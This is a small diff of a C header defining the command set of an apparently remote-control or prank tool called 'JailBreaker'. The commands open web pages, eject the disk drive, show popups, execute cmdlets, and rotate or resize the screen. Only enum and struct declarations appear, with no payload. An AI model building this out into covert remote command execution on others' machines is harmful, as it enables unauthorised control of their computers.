@@ -26,8 +26,9 @@ typedef enum {
     JB_OPENWEB,
 
     /* --- Other --- */
-    JB_CDEJECT,     // eject disk drive
-    JB_POPUP,       // MessageBox
+    JB_CDEJECT,     // Eject disk drive
+    JB_POPUPW,      // MessageBoxW
+    JB_POPUPA,      // MessageBoxA
     JB_EXEC,        // execute a cmdlet
     JB_ROTATESCR,   // SetDisplayAutoRotationPreferences
     JB_CHANGERES,   
@@ -36,7 +37,7 @@ typedef enum {
 } JB_Instruction;
 
 typedef struct {
-    char auth[24];
+    char auth[AUTH_LENGTH];
     JB_Instruction cmd;     // JB_POPUP "Title¿"Polskie szamba liderem są w kraju"\0"
     char args[CMD_ARGSZ];
 } JBCMD; // JailBreaker Command
